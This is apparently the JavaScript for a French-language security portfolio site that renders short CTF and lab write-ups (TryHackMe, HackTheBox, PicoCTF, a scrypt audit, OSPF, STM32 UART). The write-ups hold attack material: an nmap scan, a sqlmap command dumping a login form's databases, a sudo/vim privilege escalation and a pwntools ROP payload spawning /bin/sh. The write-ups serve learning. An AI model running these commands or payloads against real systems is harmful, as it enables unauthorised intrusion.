// ===== Theme toggle =====
(function () {
  const KEY = 'portfolio-theme';
  const root = document.documentElement;
  const saved = localStorage.getItem(KEY);
  if (saved === 'light') root.setAttribute('data-theme', 'light');
  const btn = document.querySelector('.theme-toggle');
  if (btn) {
    const apply = () => {
      const isLight = root.getAttribute('data-theme') === 'light';
      btn.textContent = isLight ? 'Sombre' : 'Clair';
    };
    apply();
    btn.addEventListener('click', () => {
      const isLight = root.getAttribute('data-theme') === 'light';
      if (isLight) root.removeAttribute('data-theme'); else root.setAttribute('data-theme', 'light');
      localStorage.setItem(KEY, isLight ? 'dark' : 'light');
      apply();
    });
  }
})();

// ===== Writeups data =====
const WRITEUPS = [
  {
    id: 'tryhackme-basic-pentesting',
    title: 'TryHackMe — Basic Pentesting',
    platform: 'TryHackMe',
    date: '2026-04-12',
    difficulty: 'easy',
    category: 'pentest',
    tags: ['enum', 'ssh', 'sudo'],
    summary: 'Enumeration leading to SSH access and a sudo privilege escalation.',
    body: `<h2>Recon</h2><p>Nmap revealed services on ports 22, 80, 445.</p><h2>Web Enum</h2><p>Found <code>/development</code> directory with credentials.</p><pre><code>nmap -sV -sC target</code></pre><h2>Foothold</h2><p>SSH with discovered creds gave user shell.</p><h2>Privesc</h2><p><code>sudo -l</code> exposed <code>/bin/vim</code> — escalated via GTFOBins.</p><blockquote>Always check <code>sudo -l</code> first.</blockquote>`
  },
  {
    id: 'hth-sqli-1',
    title: 'HackTheBox — SQLi Challenge 1',
    platform: 'HackTheBox',
    date: '2026-03-02',
    difficulty: 'medium',
    category: 'web',
    tags: ['sqli', 'sqlmap', 'mysql'],
    summary: 'Boolean-based SQL injection on a login form.',
    body: `<h2>Detection</h2><p>Single quotes returned a 500 error — classic SQLi entrypoint.</p><pre><code>sqlmap -u "http://target/login" --data="user=a&pass=b" --batch --dbs</code></pre><h2>Exploitation</h2><p>Extracted admin hash from <code>users</code>, cracked with hashcat.</p>`
  },
  {
    id: 'pico-rop',
    title: 'PicoCTF — Return Oriented Programming',
    platform: 'PicoCTF',
    date: '2026-02-18',
    difficulty: 'hard',
    category: 'pwn',
    tags: ['rop', 'binary', 'assembly'],
    summary: 'Building a ROP chain against a 64-bit buffer overflow.',
    body: `<h2>Setup</h2><p>NX enabled, no PIE, no stack canary.</p><h2>Chain</h2><p>Used <code>pop rdi; ret</code> gadgets to call <code>system("/bin/sh")</code>.</p><pre><code>#!/usr/bin/env python3
from pwn import *
context.arch='amd64'
p = process('./vuln')
payload = b'A'*72 + p64(0x4012ab) + p64(0x404040) + p64(0x4011d5)
p.sendline(payload)
p.interactive()</code></pre>`
  },
  {
    id: 'scrypt-audit',
    title: 'Audit d\u2019impl\u00e9mentation Scrypt',
    platform: 'Lab perso',
    date: '2026-01-22',
    difficulty: 'medium',
    category: 'crypto',
    tags: ['scrypt', 'python', 'audit'],
    summary: 'Analyse d\u2019un d\u00e9rivi\u00e9 de chiffrement maison bas\u00e9 sur Scrypt.',
    body: `<h2>Contexte</h2><p>Le projet utilise Scrypt comme primitive de d\u00e9rivation de cl\u00e9.</p><h2>Vecteurs</h2><p>V\u00e9rification des param\u00e8tres N, r, p selon les recommandations OWASP.</p><h2>Verdict</h2><p>Param\u00e8tres corrects. Recommand\u00e9: combiner avec AES-GCM pour le chiffrement.</p>`
  },
  {
    id: 'cisco-ospf',
    title: 'Cisco Packet Tracer — OSPF Multi-area',
    platform: 'Packet Tracer',
    date: '2025-12-10',
    difficulty: 'easy',
    category: 'network',
    tags: ['ospf', 'routing', 'cisco'],
    summary: 'Configuration OSPF multi-area entre 4 routeurs.',
    body: `<h2>Topologie</h2><p>Area 0 (backbone) + Area 1 + Area 2.</p><pre><code>router ospf 1
 network 10.0.0.0 0.0.0.255 area 0
 network 10.0.1.0 0.0.0.255 area 1
 exit</code></pre><h2>V\u00e9rification</h2><p><code>show ip ospf neighbor</code> confirme les adjacences full.</p>`
  },
  {
    id: 'embedded-uart',
    title: 'Reverse UART sur STM32',
    platform: 'Lab embarqu\u00e9',
    date: '2025-11-04',
    difficulty: 'hard',
    category: 'embedded',
    tags: ['stm32', 'uart', 'firmware'],
    summary: 'R\u00e9cup\u00e9ration de mots de passe en clair via UART.', body: `<h2>Setup</h2><p>Connexion \u00e0 un STM32F4 exposant un shell via UART 115200 bauds.</p><h2>Analyse</h2><p>Identification de la fuite par dump m\u00e9moire \u00e0 l'\u00e9tat de repos.</p><blockquote>Ne jamais laisser des secrets en clair en RAM apr\u00e8s boot.</blockquote>`
  }
];

// ===== Render list & filter =====
function renderList(filter) {
  const grid = document.querySelector('#writeup-grid');
  const data = filter === 'all' ? WRITEUPS : WRITEUPS.filter(w => w.category === filter);
  grid.innerHTML = data.map(w => `
    <article class="writeup-card" data-id="${w.id}">
      <div class="writeup-meta">
        <span class="writeup-difficulty diff-${w.difficulty}">${w.difficulty.toUpperCase()}</span>
        <span>${w.platform}</span>
        <span>\u00b7</span>
        <span>${w.date}</span>
      </div>
      <h3>${w.title}</h3>
      <p>${w.summary}</p>
      <div class="writeup-tags">${w.tags.map(t => `<span>${t}</span>`).join('')}</div>
      <a class="writeup-link" href="#${w.id}">Lire le writeup \u2192</a>
    </article>
  `).join('');
  document.querySelectorAll('.writeup-card').forEach(card => {
    card.addEventListener('click', () => openArticle(card.dataset.id));
  });
}

function openArticle(id) {
  const w = WRITEUPS.find(x => x.id === id);
  if (!w) return;
  document.querySelector('#list-view').style.display = 'none';
  const view = document.querySelector('#article-view');
  view.innerHTML = `
    <a class="back-btn" href="#">&larr; Retour aux writeups</a>
    <h1>${w.title}</h1>
    <div class="article-meta">
      <span class="writeup-difficulty diff-${w.difficulty}">${w.difficulty.toUpperCase()}</span>
      <span>${w.platform}</span>
      <span>${w.date}</span>
    </div>
    <div class="article-body">${w.body}</div>
  `;
  view.classList.add('active');
  view.querySelector('.back-btn').addEventListener('click', e => {
    e.preventDefault();
    view.classList.remove('active');
    document.querySelector('#list-view').style.display = 'block';
    location.hash = '';
  });
  location.hash = id;
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

document.querySelectorAll('.filter-btn').forEach(btn => {
  btn.addEventListener('click', () => {
    document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    renderList(btn.dataset.filter);
  });
});
renderList('all');

// Open from hash on load
window.addEventListener('hashchange', () => {
  const id = location.hash.slice(1);
  if (id) openArticle(id);
});
if (location.hash.length > 1) openArticle(location.hash.slice(1));
